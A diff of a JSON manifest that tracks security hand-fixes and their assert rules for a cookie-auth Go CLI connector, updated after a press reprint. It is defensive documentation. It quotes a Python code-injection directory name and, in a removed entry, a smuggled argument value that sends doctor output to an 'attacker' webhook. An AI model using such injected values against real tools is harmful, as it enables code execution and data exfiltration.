@@ -72,7 +72,7 @@
     {
      "file": "cli/internal/cli/bulk.go",
      "contains": "0o600)",
-     "min_count": 5,
+     "min_count": 2,
      "code_only": true
     },
     {
@@ -100,13 +100,13 @@
   {
    "id": "cookie-exec-literal-commands",
    "summary": "Cookie extraction dispatched through a table of []string argv slices, so the executable name reached exec.Command as a variable (exec.Command(tool.check[0], tool.check[1:]...)) in both auth.go and doctor.go. Every call site now names its program as a compile-time literal.",
-   "why": "This is the FIRST cookie-auth connector in the fleet, so this shape had never been reviewed. The security gate's builtin exec-nonliteral-cmd rule and the matching semgrep rule both flag a variable command, and neither honours an inline // #nosec - the semgrep rule's own message asks for a literal command as the primary remedy. Making it literal is also the honest documentation: a reader (and governance.md's generated tool inventory) can now see the complete, closed set of programs this binary can launch without following a data structure. doctor.go now delegates to detectCookieTool() so its verdict cannot drift from what auth login actually does. DONE UPSTREAM: mvanhorn/cli-printing-press#4799 merged 2026-09-25 (closed #4746), first shipped press v4.32.5; this hand-fix stays active until a reprint absorbs it; do NOT cite #4746 as open. Fully covered. Upstream receipt: internal/generator/templates/auth_browser.go.tmpl:2796-2833 adds execNamed(), a switch whose every branch calls exec.Command with a compile-time literal program name and whose default refuses; runBrowserCaptureCommand (:891), evalBrowserCapture (:918), closeBrowserCaptureSession (:931), openBrowserForCookieRefresh (:958, :968), tryPressAuth (:1969), detectCookieTool (:1998) and extractViaPycookiecheatCLI (:2080) all route through it, and findBrowserExecutable (:982-984) returns the literal name instead of the resolved path; internal/generator/templates/doctor.go.tmpl:337-342 drops the [][]string probe table (exec.Command(check[0], ...)) and delegates to detectCookieTool(), removing doctor's os/exec import (:35-37). Upstream centralises the literal in one allowlist rather than at each call site as this hand-fix does. The asserts here pin THIS connector's hand-fix shape, not the 4.32.5 template shape, so at the absorbing reprint re-pin them to the regenerated shape rather than reading the gate failure as a regression.",
+   "why": "This is the FIRST cookie-auth connector in the fleet, so this shape had never been reviewed. The security gate's builtin exec-nonliteral-cmd rule and the matching semgrep rule both flag a variable command, and neither honours an inline // #nosec - the semgrep rule's own message asks for a literal command as the primary remedy. Making it literal is also the honest documentation: a reader (and governance.md's generated tool inventory) can now see the complete, closed set of programs this binary can launch without following a data structure. doctor.go now delegates to detectCookieTool() so its verdict cannot drift from what auth login actually does. DONE UPSTREAM: mvanhorn/cli-printing-press#4799 merged 2026-09-25 (closed #4746), first shipped press v4.32.5; this hand-fix stays active until a reprint absorbs it; do NOT cite #4746 as open. Fully covered. Upstream receipt: internal/generator/templates/auth_browser.go.tmpl:2796-2833 adds execNamed(), a switch whose every branch calls exec.Command with a compile-time literal program name and whose default refuses; runBrowserCaptureCommand (:891), evalBrowserCapture (:918), closeBrowserCaptureSession (:931), openBrowserForCookieRefresh (:958, :968), tryPressAuth (:1969), detectCookieTool (:1998) and extractViaPycookiecheatCLI (:2080) all route through it, and findBrowserExecutable (:982-984) returns the literal name instead of the resolved path; internal/generator/templates/doctor.go.tmpl:337-342 drops the [][]string probe table (exec.Command(check[0], ...)) and delegates to detectCookieTool(), removing doctor's os/exec import (:35-37). Upstream centralises the literal in one allowlist rather than at each call site as this hand-fix does. The asserts here pin THIS connector's hand-fix shape, not the 4.32.5 template shape, so at the absorbing reprint re-pin them to the regenerated shape rather than reading the gate failure as a regression. Reprint 2026-11-02 (press 4.35.1): absorbed natively; asserts re-pinned to the regenerated execNamed allowlist shape as this entry instructed.",
    "status": "upstreamed",
    "spec_encode_followup": "DURABLE FIX belongs in cli-printing-press: the 4.31.4 cookie-auth template still emits exec.Command(check[0], check[1:]...) in doctor.go and several variable-command call sites in auth.go, so a reprint reintroduces this. File via printing-press-retro so the press emits literal dispatch for the cookie backends.",
    "asserts": [
     {
      "file": "cli/internal/cli/auth.go",
-     "contains": "func detectCookieTool",
+     "contains": "func execNamed(name string, args ...string) (*exec.Cmd, error) {",
      "min_count": 1,
      "code_only": true
     },
@@ -119,6 +119,12 @@
     {
      "file": "cli/internal/cli/auth.go",
      "contains": "exec.Command(\"cookie-scoop\", \"--help\")",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/auth.go",
+     "contains": "return nil, fmt.Errorf(\"refusing to execute %q\", name)",
      "min_count": 1,
      "code_only": true
     },
@@ -141,19 +147,25 @@
   {
    "id": "cookie-python-script-via-file",
    "summary": "The pycookiecheat backend ran its extraction script through `python3 -c <script>`. It now writes the script to a 0600 file inside a 0700 temp dir and runs `python3 <path>`.",
-   "why": "Two reasons, and the security one is real rather than cosmetic. (1) A `-c` payload is visible in the process table to every other account on the machine, and this particular script embeds the absolute path of the operator's Chrome profile - so the previous shape leaked where the cookie database lives to any local user running ps. (2) An interpreter invoked with -c is exactly the shape the gate's shell-interpreter rule and semgrep's msp-shell-interpreter-exec rule exist to stop, and neither honours an inline // #nosec. The script content itself is built by this file and never contains caller input. DONE UPSTREAM: mvanhorn/cli-printing-press#4799 merged 2026-09-25 (closed #4746), first shipped press v4.32.5; this hand-fix stays active until a reprint absorbs it; do NOT cite #4746 as open. Fully covered. Upstream receipt: internal/generator/templates/auth_browser.go.tmpl:2839-2862 runPythonFile() writes the program to helper.py at 0o600 inside os.MkdirTemp(\"\", \"pp-cookie-py-\") (0700), runs `<python> <path> <args...>` via execNamed and RemoveAll's the dir; extractViaPycookiecheat (:2055) and the detectCookieTool import probe (:1993) both use it, and generator_test.go:13148-13151 pins that the `-c` form is gone. Upstream names it runPythonFile where this hand-fix names it runPythonScript. The asserts here pin THIS connector's hand-fix shape, not the 4.32.5 template shape, so at the absorbing reprint re-pin them to the regenerated shape rather than reading the gate failure as a regression.",
+   "why": "Two reasons, and the security one is real rather than cosmetic. (1) A `-c` payload is visible in the process table to every other account on the machine, and this particular script embeds the absolute path of the operator's Chrome profile - so the previous shape leaked where the cookie database lives to any local user running ps. (2) An interpreter invoked with -c is exactly the shape the gate's shell-interpreter rule and semgrep's msp-shell-interpreter-exec rule exist to stop, and neither honours an inline // #nosec. The script content itself is built by this file and never contains caller input. DONE UPSTREAM: mvanhorn/cli-printing-press#4799 merged 2026-09-25 (closed #4746), first shipped press v4.32.5; this hand-fix stays active until a reprint absorbs it; do NOT cite #4746 as open. Fully covered. Upstream receipt: internal/generator/templates/auth_browser.go.tmpl:2839-2862 runPythonFile() writes the program to helper.py at 0o600 inside os.MkdirTemp(\"\", \"pp-cookie-py-\") (0700), runs `<python> <path> <args...>` via execNamed and RemoveAll's the dir; extractViaPycookiecheat (:2055) and the detectCookieTool import probe (:1993) both use it, and generator_test.go:13148-13151 pins that the `-c` form is gone. Upstream names it runPythonFile where this hand-fix names it runPythonScript. The asserts here pin THIS connector's hand-fix shape, not the 4.32.5 template shape, so at the absorbing reprint re-pin them to the regenerated shape rather than reading the gate failure as a regression. Reprint 2026-11-02 (press 4.35.1): absorbed natively (runPythonFile); asserts re-pinned to the regenerated shape.",
    "status": "upstreamed",
    "spec_encode_followup": "DURABLE FIX belongs in cli-printing-press: the cookie-auth template should never emit `python3 -c`. File via printing-press-retro alongside the literal-dispatch finding.",
    "asserts": [
     {
      "file": "cli/internal/cli/auth.go",
-     "contains": "func runPythonScript",
+     "contains": "func runPythonFile(bin string, leading []string, script string, scriptArgs ...string) ([]byte, error) {",
      "min_count": 1,
      "code_only": true
     },
     {
      "file": "cli/internal/cli/auth.go",
-     "contains": "exec.Command(\"python3\", scriptPath)",
+     "contains": "os.MkdirTemp(\"\", \"pp-cookie-py-\")",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/auth.go",
+     "contains": "credkit.WriteFile(scriptPath, []byte(script), 0o600)",
      "min_count": 1,
      "code_only": true
     },
@@ -166,19 +178,19 @@
   {
    "id": "fts-rowid-byte-hash",
    "summary": "store.go's ftsRowID hashed over runes, converting a signed int32 to uint64 at each step. It now hashes over UTF-8 bytes.",
-   "why": "gosec G115 (integer overflow conversion rune -> uint64), twice. A byte is unsigned, so widening it is exact and the finding disappears structurally instead of being annotated away. Behaviour is otherwise identical: the function only needs a deterministic positive rowid, and it is never persisted anywhere a value change could matter across versions (it is recomputed on every FTS write, and this connector has never been released so no local database exists carrying old rowids). Press 4.31.4 does not emit ftsRowID at all for this spec, so there is no upstream version to match.",
-   "status": "active",
+   "why": "gosec G115 (integer overflow conversion rune -> uint64), twice. A byte is unsigned, so widening it is exact and the finding disappears structurally instead of being annotated away. Behaviour is otherwise identical: the function only needs a deterministic positive rowid, and it is never persisted anywhere a value change could matter across versions (it is recomputed on every FTS write, and this connector has never been released so no local database exists carrying old rowids). Press 4.31.4 does not emit ftsRowID at all for this spec, so there is no upstream version to match. Reprint 2026-11-02 (press 4.35.1): press 4.35.1 emits ftsRowID as an FNV-64a hash over bytes (no rune->uint64 conversion), which is the property this entry protected; asserts re-pinned. Note the rowid VALUES differ from the 4.4.0 hash, which is harmless: no store was ever filled by sync on this connector (its 4.4.0 sync had an empty resource map).",
+   "status": "upstreamed",
    "spec_encode_followup": "None. If a future press reprint stops emitting ftsRowID (4.31.4 already does not), this assert fails loudly and a human confirms the FTS delete path still works - which is the designed behaviour of this gate, not a false alarm.",
    "asserts": [
     {
      "file": "cli/internal/store/store.go",
-     "contains": "h = h*31 + uint64(scope[i])",
+     "contains": "_, _ = h.Write([]byte(scope))",
      "min_count": 1,
      "code_only": true
     },
     {
      "file": "cli/internal/store/store.go",
-     "contains": "h = h*31 + uint64(id[i])",
+     "contains": "_, _ = h.Write([]byte(id))",
      "min_count": 1,
      "code_only": true
     },
@@ -191,7 +203,7 @@
   {
    "id": "go-directive-and-http3-dep-floor",
    "summary": "go.mod declared `go 1.26.3` and carried the HTTP/3 dependency set the 4.4.0 press pinned. The directive is now 1.26.10 and the surf-transitive deps are floored at the versions a real 4.31.4 print of this spec resolves.",
-   "why": "The patch-pinned 1.26.3 directive made osv-scanner report stdlib advisories that map to no go.mod module, which the security gate treats as an unsuppressible control-plane failure (13 P1), and it put the connector below the repo's own Go floor guard in ci_guards.sh. The old dependency set also carried 20 advisories against golang.org/x/crypto v0.51.0 alone. Press 4.31.4 emits `go 1.26.6` plus an explicit `require golang.org/x/crypto` floor block with a comment explaining that these deps arrive only via github.com/enetx/surf; that block is reproduced here verbatim, and the versions were then raised to the newest release that clears each advisory. Raised again on 2026-09-06: x/crypto v0.55.0 -> v0.56.0, which clears GO-2026-6354 and GO-2026-6355 (two x/crypto/ssh DoS advisories published after the first print, both fixed in v0.56.0). The one advisory that survives the bump is GO-2026-5932, which carries no fixed version at all, is scoped to the openpgp subpackages this connector never builds, and is handled by a base-policy suppression rather than a version change. Raised again on 2026-10-14 in the fleet Go bump: directive go 1.26.6 -> go 1.26.9, which clears the net/http, mime/multipart and crypto/tls stdlib advisories fixed in go1.26.9 (GO-2026-6617, GO-2026-6613 and GO-2026-6612 among them). Raised again on 2026-10-21 in the next fleet Go bump: directive go 1.26.9 -> go 1.26.10, which clears GO-2026-6809 (crypto/x509 now distrusts compromised intermediate certificates). govulncheck reports zero reachable vulnerabilities.",
+   "why": "The patch-pinned 1.26.3 directive made osv-scanner report stdlib advisories that map to no go.mod module, which the security gate treats as an unsuppressible control-plane failure (13 P1), and it put the connector below the repo's own Go floor guard in ci_guards.sh. The old dependency set also carried 20 advisories against golang.org/x/crypto v0.51.0 alone. Press 4.31.4 emits `go 1.26.6` plus an explicit `require golang.org/x/crypto` floor block with a comment explaining that these deps arrive only via github.com/enetx/surf; that block is reproduced here verbatim, and the versions were then raised to the newest release that clears each advisory. Raised again on 2026-09-06: x/crypto v0.55.0 -> v0.56.0, which clears GO-2026-6354 and GO-2026-6355 (two x/crypto/ssh DoS advisories published after the first print, both fixed in v0.56.0). The one advisory that survives the bump is GO-2026-5932, which carries no fixed version at all, is scoped to the openpgp subpackages this connector never builds, and is handled by a base-policy suppression rather than a version change. Raised again on 2026-10-14 in the fleet Go bump: directive go 1.26.6 -> go 1.26.9, which clears the net/http, mime/multipart and crypto/tls stdlib advisories fixed in go1.26.9 (GO-2026-6617, GO-2026-6613 and GO-2026-6612 among them). Raised again on 2026-10-21 in the next fleet Go bump: directive go 1.26.9 -> go 1.26.10, which clears GO-2026-6809 (crypto/x509 now distrusts compromised intermediate certificates). govulncheck reports zero reachable vulnerabilities. Reprint 2026-11-02 (press 4.35.1): the render pins go 1.26.10; x/net raised to v0.62.0 (GO-2026-6860, GO-2026-6866), which pulled x/crypto v0.58.0 (floor comment emitted natively); mcp-go v0.57.0 pinned too (work order: mcp-go >= v0.57.0).",
    "status": "upstreamed",
    "spec_encode_followup": "No spec change needed. A full reprint re-emits the directive and the floor block, and a press that emits a directive below go 1.26.10 trips this assert, which is intended; the individual version numbers will drift upward with the press's own resolution and that is expected.",
    "asserts": [
@@ -202,25 +214,30 @@
     },
     {
      "file": "cli/go.mod",
-     "contains": "require golang.org/x/crypto v0.56.0",
+     "contains": "require golang.org/x/crypto v0.58.0",
      "min_count": 1
     },
     {
      "file": "cli/go.mod",
      "not_contains": "go 1.26.3"
+    },
+    {
+     "file": "cli/go.mod",
+     "contains": "github.com/mark3labs/mcp-go v0.57.0",
+     "min_count": 1
     }
    ]
   },
   {
    "id": "cookie-probe-temp-copy-0600",
    "summary": "The Chrome-profile probe copied each profile's cookie database to /tmp to count rows. The main file got 0600 from os.CreateTemp, but the '-wal' and '-shm' siblings were created with os.Create (0666 before umask), so on a default umask they landed WORLD-READABLE. The whole set now goes inside a 0700 temp directory and copyFileIfExists writes 0600 explicitly.",
-   "why": "This is the highest-value fix in the connector and no scanner found it: gosec's G306 only looks at os.WriteFile, not os.Create, so the permission never appeared in any gate. What was exposed is not a niche artifact - a Chrome '-wal' holds cookie writes that have not been checkpointed yet, and the '.db' copy is a verbatim duplicate of the operator's cookie store for EVERY site they are signed in to, not just this vendor. Any other local account could read both for the lifetime of the probe, which runs on every `auth login --chrome` and every `doctor`. Fixed in the printing-press library source too, since these are novel files the AST-merge carries forward. DONE UPSTREAM: mvanhorn/cli-printing-press#4799 merged 2026-09-25 (closed #4746), first shipped press v4.32.5; this hand-fix stays active until a reprint absorbs it; do NOT cite #4746 as open. Fully covered. Upstream receipt: internal/generator/templates/auth_browser.go.tmpl:1697-1705 inspectCookiesForDomain replaces os.CreateTemp(\"\", \"cookies-probe-*.db\") with os.MkdirTemp(\"\", \"pp-cookie-probe-\") (0700) + defer os.RemoveAll, copying to <dir>/cookies.db; copyFileIfExists (:1771) opens the destination O_WRONLY|O_CREATE|O_TRUNC at 0o600, so the -wal and -shm siblings are 0600 too. The temp-dir prefix differs (pp-cookie-probe- upstream, riverside-cookie-probe- here). The asserts here pin THIS connector's hand-fix shape, not the 4.32.5 template shape, so at the absorbing reprint re-pin them to the regenerated shape rather than reading the gate failure as a regression.",
+   "why": "This is the highest-value fix in the connector and no scanner found it: gosec's G306 only looks at os.WriteFile, not os.Create, so the permission never appeared in any gate. What was exposed is not a niche artifact - a Chrome '-wal' holds cookie writes that have not been checkpointed yet, and the '.db' copy is a verbatim duplicate of the operator's cookie store for EVERY site they are signed in to, not just this vendor. Any other local account could read both for the lifetime of the probe, which runs on every `auth login --chrome` and every `doctor`. Fixed in the printing-press library source too, since these are novel files the AST-merge carries forward. DONE UPSTREAM: mvanhorn/cli-printing-press#4799 merged 2026-09-25 (closed #4746), first shipped press v4.32.5; this hand-fix stays active until a reprint absorbs it; do NOT cite #4746 as open. Fully covered. Upstream receipt: internal/generator/templates/auth_browser.go.tmpl:1697-1705 inspectCookiesForDomain replaces os.CreateTemp(\"\", \"cookies-probe-*.db\") with os.MkdirTemp(\"\", \"pp-cookie-probe-\") (0700) + defer os.RemoveAll, copying to <dir>/cookies.db; copyFileIfExists (:1771) opens the destination O_WRONLY|O_CREATE|O_TRUNC at 0o600, so the -wal and -shm siblings are 0600 too. The temp-dir prefix differs (pp-cookie-probe- upstream, riverside-cookie-probe- here). The asserts here pin THIS connector's hand-fix shape, not the 4.32.5 template shape, so at the absorbing reprint re-pin them to the regenerated shape rather than reading the gate failure as a regression. Reprint 2026-11-02 (press 4.35.1): absorbed natively (pp-cookie-probe- 0700 dir, 0600 copies); asserts re-pinned.",
    "status": "upstreamed",
    "spec_encode_followup": "DURABLE FIX belongs in cli-printing-press if the cookie-auth template grows this probe: temp copies of a credential store must be created 0600 inside a 0700 directory, never with os.Create. File via printing-press-retro alongside the literal-dispatch and python3-c findings.",
    "asserts": [
     {
      "file": "cli/internal/cli/auth.go",
-     "contains": "os.MkdirTemp(\"\", \"riverside-cookie-probe-\")",
+     "contains": "os.MkdirTemp(\"\", \"pp-cookie-probe-\")",
      "min_count": 1,
      "code_only": true
     },
@@ -308,25 +325,31 @@
   {
    "id": "doctor-probe-rejects-login-redirect",
    "summary": "The credential probe called any 2xx 'valid'. This client follows redirects, so an expired cookie session bounced to a sign-in page ended at a 200 and was reported as a working session. The probe now reads the body and refuses to say 'valid' unless it is a JSON document and not a known interstitial.",
-   "why": "This is the exact false-GREEN doctor_verdict.go was added to remove, reintroduced one layer down - and it bites harder on a cookie connector than an API-key one, because a browser session expires on the vendor's schedule with no warning and a redirect to the sign-in page is the NORMAL way that shows up. client.go gained ProbeGetBody (a cache-free GET that also returns the body) because status alone cannot distinguish the two; going through c.do keeps the existing guarantee that a server-side revocation cannot be masked by a cached 200. Upstream #4746 (closed 2026-09-25 via #4799) did not cover this item; hand-fix is permanent unless re-filed. PR #4799 names it explicitly as out of scope (`doctor-probe-rejects-login-redirect` and the sync/store emission gap stay out of scope) and no hunk in internal/generator/templates/doctor.go.tmpl touches the credential probe: the only doctor changes are the cookie-tool probe (:337-342) and --fail-on (:1248-1310). ProbeGetBody / looksLikeJSONDocument / looksLikeDoctorInterstitial remain connector-only.",
-   "status": "active",
+   "why": "This is the exact false-GREEN doctor_verdict.go was added to remove, reintroduced one layer down - and it bites harder on a cookie connector than an API-key one, because a browser session expires on the vendor's schedule with no warning and a redirect to the sign-in page is the NORMAL way that shows up. client.go gained ProbeGetBody (a cache-free GET that also returns the body) because status alone cannot distinguish the two; going through c.do keeps the existing guarantee that a server-side revocation cannot be masked by a cached 200. Upstream #4746 (closed 2026-09-25 via #4799) did not cover this item; hand-fix is permanent unless re-filed. PR #4799 names it explicitly as out of scope (`doctor-probe-rejects-login-redirect` and the sync/store emission gap stay out of scope) and no hunk in internal/generator/templates/doctor.go.tmpl touches the credential probe: the only doctor changes are the cookie-tool probe (:337-342) and --fail-on (:1248-1310). ProbeGetBody / looksLikeJSONDocument / looksLikeDoctorInterstitial remain connector-only. Reprint 2026-11-02 (press 4.35.1): absorbed natively: doctor probes the authenticated GET /user (auth.verify_path) through the no-cache client path, and the client returns an error, never a 2xx, when the body is an HTML page (a 302-to-sign-in that ends at a 200 login page), so doctor reports 'error: ... returned HTML' instead of 'valid'. ProbeGetBody and doctor_verdict.go are gone; asserts re-pinned.",
+   "status": "upstreamed",
    "spec_encode_followup": "DURABLE FIX belongs in cli-printing-press: any generated credential probe that runs behind a redirect-following client must validate the response shape, not just the status. File via printing-press-retro.",
    "asserts": [
     {
      "file": "cli/internal/client/client.go",
-     "contains": "func (c *Client) ProbeGetBody(",
+     "contains": "expected JSON, API returned HTML instead of JSON",
      "min_count": 1,
      "code_only": true
     },
     {
-     "file": "cli/internal/cli/doctor_verdict.go",
-     "contains": "looksLikeJSONDocument(body)",
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "verifyPath := \"/user\"",
      "min_count": 1,
      "code_only": true
     },
     {
-     "file": "cli/internal/cli/doctor_verdict.go",
-     "contains": "looksLikeDoctorInterstitial(body)",
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "c.GetWithHeadersNoCache(cmd.Context(), verifyPath, authParams, authHeaders)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "report[\"credentials\"] = fmt.Sprintf(\"error: %s\", authErr)",
      "min_count": 1,
      "code_only": true
     }
@@ -335,24 +358,24 @@
   {
    "id": "fail-on-error-case-insensitive",
    "summary": "`doctor --fail-on=error` matched the lower-case word 'error' only, while every credential and base-URL verdict opens with an upper-case 'ERROR'. Automation got exit 0 for an expired session. The scan is now case-insensitive, covers 'rejected' and 'not verified', and skips informational rows.",
-   "why": "The single state --fail-on=error exists to catch is the one it could not see. The info-key exclusion is the paired half: without it the scan trips on a healthy connector whose auth hint contains the word 'missing', which is the same defect pointed the other way and is why the fleet's other connectors carry doctorInfoKeys. DONE UPSTREAM: mvanhorn/cli-printing-press#4799 merged 2026-09-25 (closed #4746), first shipped press v4.32.5; this hand-fix stays active until a reprint absorbs it; do NOT cite #4746 as open. PARTIAL coverage only. Upstream receipt: internal/generator/templates/doctor.go.tmpl:1248-1274 adds doctorInfoKeys (auth_hint, cookie_tool, credentials_location(s), version, ...) and doctorIsInfoKey(); doctorExitForFailOn (:1282-1310) lower-cases the --fail-on value and every string verdict, skips info keys, treats a WARN prefix as the verdict so explanatory text cannot promote it, adds a `rejected` prefix to the error set, and case-folds nested status values. The behaviour is NOT identical: this hand-fix has no WARN-prefix guard and matches the `not verified` substring, so the connector's `WARN not verified ...` verdicts (doctor_verdict.go:211,247,249) trip --fail-on=error here while upstream keeps them warnings and has no `not verified` token at all. Whether that stricter exit is wanted is an open decision for the absorbing reprint, which is why this entry stays active rather than upstreamed. Upstream declares doctorInfoKeys in doctor.go where this hand-fix keeps it in doctor_verdict.go. The asserts here pin THIS connector's hand-fix shape, not the 4.32.5 template shape, so at the absorbing reprint re-pin them to the regenerated shape rather than reading the gate failure as a regression.",
-   "status": "active",
+   "why": "The single state --fail-on=error exists to catch is the one it could not see. The info-key exclusion is the paired half: without it the scan trips on a healthy connector whose auth hint contains the word 'missing', which is the same defect pointed the other way and is why the fleet's other connectors carry doctorInfoKeys. DONE UPSTREAM: mvanhorn/cli-printing-press#4799 merged 2026-09-25 (closed #4746), first shipped press v4.32.5; this hand-fix stays active until a reprint absorbs it; do NOT cite #4746 as open. PARTIAL coverage only. Upstream receipt: internal/generator/templates/doctor.go.tmpl:1248-1274 adds doctorInfoKeys (auth_hint, cookie_tool, credentials_location(s), version, ...) and doctorIsInfoKey(); doctorExitForFailOn (:1282-1310) lower-cases the --fail-on value and every string verdict, skips info keys, treats a WARN prefix as the verdict so explanatory text cannot promote it, adds a `rejected` prefix to the error set, and case-folds nested status values. The behaviour is NOT identical: this hand-fix has no WARN-prefix guard and matches the `not verified` substring, so the connector's `WARN not verified ...` verdicts (doctor_verdict.go:211,247,249) trip --fail-on=error here while upstream keeps them warnings and has no `not verified` token at all. Whether that stricter exit is wanted is an open decision for the absorbing reprint, which is why this entry stays active rather than upstreamed. Upstream declares doctorInfoKeys in doctor.go where this hand-fix keeps it in doctor_verdict.go. The asserts here pin THIS connector's hand-fix shape, not the 4.32.5 template shape, so at the absorbing reprint re-pin them to the regenerated shape rather than reading the gate failure as a regression. Reprint 2026-11-02 (press 4.35.1): absorbed natively (doctorExitForFailOn folds case, skips info keys, keeps WARN-prefixed verdicts as warnings). The open decision this entry named is settled in favour of upstream: doctor now probes /user, so 'WARN not verified' only appears when the probe reaches a non-auth status, and --fail-on=warn trips on it.",
+   "status": "upstreamed",
    "spec_encode_followup": "DURABLE FIX belongs in cli-printing-press: the generated doctorExitForFailOn should fold case and consult doctorInfoKeys. File via printing-press-retro.",
    "asserts": [
     {
      "file": "cli/internal/cli/doctor.go",
-     "contains": "strings.ToLower(s)",
+     "contains": "low := strings.ToLower(s)",
      "min_count": 1,
      "code_only": true
     },
     {
      "file": "cli/internal/cli/doctor.go",
-     "contains": "doctorIsInfoKey(k)",
+     "contains": "!doctorIsInfoKey(k)",
      "min_count": 1,
      "code_only": true
     },
     {
-     "file": "cli/internal/cli/doctor_verdict.go",
+     "file": "cli/internal/cli/doctor.go",
      "contains": "func doctorIsInfoKey(",
      "min_count": 1,
      "code_only": true
@@ -362,50 +385,29 @@
   {
    "id": "python-literals-encoded",
    "summary": "The pycookiecheat helper source interpolated the domain and the Chrome profile path between bare double quotes. Both are now rendered through encoding/json, which emits a correctly escaped literal that is valid Python.",
-   "why": "cookiePath is built from a Chrome profile DIRECTORY NAME read off the filesystem, and the only filter is a `Profile ` prefix check - so a directory named `Profile \"); __import__(\"os\").system(...)  #` would have closed the string and appended executable Python to the helper. Reaching it needs a local write into the browser data directory, which is a narrow precondition, but interpolating an unescaped value into source is never the right shape and the fix costs nothing. JSON string syntax is a subset of Python's, so the encoder is a correct quoter here. Upstream #4746 (closed 2026-09-25 via #4799) did not cover this item; no re-file is needed and the hand-fix stays active only until a reprint replaces it with the press's argv shape. No hunk in #4799 changes how the domain or cookie path reach the Python helper because the press had already stopped interpolating them before this PR: the pre-#4799 template passes the URL and cookie path as argv (internal/generator/templates/auth_browser.go.tmpl:2047-2054 context; TestGeneratedPycookiecheatPassesCookiePathViaArgv forbids fmt.Sprintf and safePath in that function) and #4799 keeps that contract. So there is no upstream literal to encode; a reprint from any current press replaces pyString() with the argv shape rather than restoring the interpolation, and until that reprint this hand-fix is what protects the 4.4.0-era auth.go.",
-   "status": "active",
+   "why": "cookiePath is built from a Chrome profile DIRECTORY NAME read off the filesystem, and the only filter is a `Profile ` prefix check - so a directory named `Profile \"); __import__(\"os\").system(...)  #` would have closed the string and appended executable Python to the helper. Reaching it needs a local write into the browser data directory, which is a narrow precondition, but interpolating an unescaped value into source is never the right shape and the fix costs nothing. JSON string syntax is a subset of Python's, so the encoder is a correct quoter here. Upstream #4746 (closed 2026-09-25 via #4799) did not cover this item; no re-file is needed and the hand-fix stays active only until a reprint replaces it with the press's argv shape. No hunk in #4799 changes how the domain or cookie path reach the Python helper because the press had already stopped interpolating them before this PR: the pre-#4799 template passes the URL and cookie path as argv (internal/generator/templates/auth_browser.go.tmpl:2047-2054 context; TestGeneratedPycookiecheatPassesCookiePathViaArgv forbids fmt.Sprintf and safePath in that function) and #4799 keeps that contract. So there is no upstream literal to encode; a reprint from any current press replaces pyString() with the argv shape rather than restoring the interpolation, and until that reprint this hand-fix is what protects the 4.4.0-era auth.go. Reprint 2026-11-02 (press 4.35.1): replaced by the press's argv shape as this entry predicted: the domain and cookie path reach the helper as sys.argv, never as source. pyString() is gone; the not_contains asserts keep the interpolated form out.",
+   "status": "upstreamed",
    "spec_encode_followup": "DURABLE FIX belongs in cli-printing-press alongside the other cookie-template findings: values interpolated into a generated helper script must be encoded, not concatenated.",
    "asserts": [
     {
      "file": "cli/internal/cli/auth.go",
-     "contains": "func pyString(",
+     "contains": "url = sys.argv[1]",
      "min_count": 1,
      "code_only": true
     },
     {
      "file": "cli/internal/cli/auth.go",
-     "contains": "pyString(safePath)",
+     "contains": "scriptArgs = append(scriptArgs, cookiePath)",
      "min_count": 1,
      "code_only": true
     },
     {
      "file": "cli/internal/cli/auth.go",
      "not_contains": "chrome_cookies(\"https://%s\", cookie_file=\"%s\")"
-    }
-   ]
-  },
-  {
-   "id": "mcp-argv-value-joined",
-   "summary": "cliArgsFromMCP emitted every tool-call value as its OWN argv element after its flag (--json <value>). Every value-carrying branch (string, float64, []any, default) now joins the value to the flag as one element (--json=<value>); bool true stays a bare --flag and the empty-string skip is unchanged.",
-   "why": "blockedRootFlags filters KEYS only. A Cobra bool flag has NoOptDefVal and does not consume the token after it, so a tool-call VALUE that begins with '--' was parsed by pflag as its own flag: {\"json\": \"--deliver=webhook:https://attacker/\"} became argv `--json --deliver=webhook:...` and the denylisted --deliver took effect. Proven end to end on the real hudu-mcp binary (the same generated shellout.go): a local webhook received 4,797 bytes of `doctor --json` output. Joined, pflag rejects the value outright on a bool flag (strconv.ParseBool) and contains it as the literal value on a string flag, so no value can ever reach a second flag. Upstream cli-printing-press 4.31.4 still emits the split form, so a reprint from the current press REINTRODUCES the defect while go build and go test stay green; this entry is what notices. code_only because the explanatory comment above the loop describes the joined form - the assert must be satisfied by the emission lines themselves. shellout_test.go (TestCliArgsFromMCP_ValueCannotSmuggleBlockedFlag) proves both directions: the split argv sets --deliver, the joined argv cannot.",
-   "status": "active",
-   "spec_encode_followup": "DURABLE FIX belongs in cli-printing-press: the cobratree/shellout.go template must emit --flag=value for every value-carrying type (4.31.4 still emits the split form). File via printing-press-retro alongside the cookie-template findings. A full reprint at a press that carries the fix makes this entry a no-op.",
-   "asserts": [
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "out = append(out, \"--\"+k+\"=\"+tv)",
-     "min_count": 1,
-     "code_only": true
     },
     {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "\"--\"+k+\"=\"+",
-     "min_count": 4,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "not_contains": "\"--\"+k, "
+     "file": "cli/internal/cli/auth.go",
+     "not_contains": "pyString(safePath)"
     }
    ]
   },
@@ -437,7 +439,7 @@
   {
    "id": "no-config-write-switch",
    "summary": "RIVERSIDE_FM_NO_CONFIG_WRITE makes every credential write a no-op (the automatic token cache included) while leaving the `auth logout` erase working, and the MCP server honours it too (issue #270)",
